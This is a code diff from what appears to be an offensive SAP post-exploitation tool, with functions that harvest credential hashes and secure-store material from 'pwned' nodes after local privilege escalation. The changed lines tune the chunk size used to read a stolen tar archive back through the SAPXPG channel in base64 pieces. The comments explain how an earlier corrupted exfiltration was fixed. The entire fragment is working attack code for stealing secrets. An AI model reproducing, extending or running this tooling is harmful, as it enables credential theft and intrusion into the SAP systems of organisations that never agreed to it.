@@ -379,10 +379,11 @@ def harvest_scc_from_pwned_node(node: SAPNode, state: SAPMAPState) -> dict:
                       f"(prefix={sudo_prefix!r})")
                 if sz <= 0:
                     return None
-                # sapxpg truncates stdout to ~128 bytes per response.
-                # 249 raw bytes (83×3) → pad-free b64 chunks that
-                # concatenate safely.  Must be a multiple of 3.
-                _CHUNK = 249
+                # sapxpg kernel 793+ truncates P4 output to ~128
+                # bytes per TLV block.  72 raw bytes → 96 b64 chars,
+                # well under the ceiling.  Must also be a multiple
+                # of 3 so intermediate chunks carry no '=' padding.
+                _CHUNK = 72
                 chunks = []
                 offset = 0
                 while offset < sz:
@@ -742,28 +743,16 @@ def harvest_scc_hashes_via_lpe(node: SAPNode, state: SAPMAPState) -> dict:
     # ---- Phase 3: read the tar back via the unprivileged channel
     # (we chowned it to sidadm:sapsys so this just works)
     #
-    # Two independent constraints stack on the chunk size:
+    # Chunk size must satisfy two constraints simultaneously:
+    #   (a) SAPXPG P4 TLV ceiling: kernel 793+ caps each output block
+    #       at ~128 bytes.  The base64 encoding of the chunk must fit.
+    #   (b) Multiple-of-3: so intermediate chunks carry no '=' padding
+    #       and concatenation produces a valid base64 stream.
     #
-    #  (a) SAPXPG stdout cap.  The per-response TLV ceiling on kernel
-    #      793+ is roughly 250 B; the earlier count=3000 produced
-    #      ~4000 chars of base64 and got silently truncated mid-line,
-    #      yielding a corrupt tar.  Earlier commit dropped to 250 raw
-    #      → ~336 chars base64 which fits.
-    #
-    #  (b) base64 padding alignment.  raw chunks that are NOT a
-    #      multiple of 3 terminate with one or two ``=`` pads.  If a
-    #      non-last chunk carries pads, concatenating across chunks
-    #      produces a stream whose length isn't ≡0 mod 4 and Python's
-    #      b64decode bails with "Incorrect padding" — exactly the
-    #      symptom the operator saw at chunk 82/82.  Forcing the chunk
-    #      to a multiple of 3 means every intermediate chunk is
-    #      pad-free; only the *last* chunk (which reads sz%chunk
-    #      bytes) carries the legitimate end-of-stream padding.
-    #
-    # 249 = 83 × 3 — under the SAPXPG cap AND a clean multiple of 3.
+    # 72 = 24×3 → 96 base64 chars — matches sap_pse_loot._CHUNKED_RAW_BYTES.
     import base64 as _b64
     import time as _t
-    _CHUNK_RAW = 249
+    _CHUNK_RAW = 72
     n_chunks = (sz + _CHUNK_RAW - 1) // _CHUNK_RAW
     print(f"[*] {sid}: scc_hashes_via_lpe — reading {sz} B in "
           f"{n_chunks} chunk(s) of {_CHUNK_RAW} B over the sidadm "
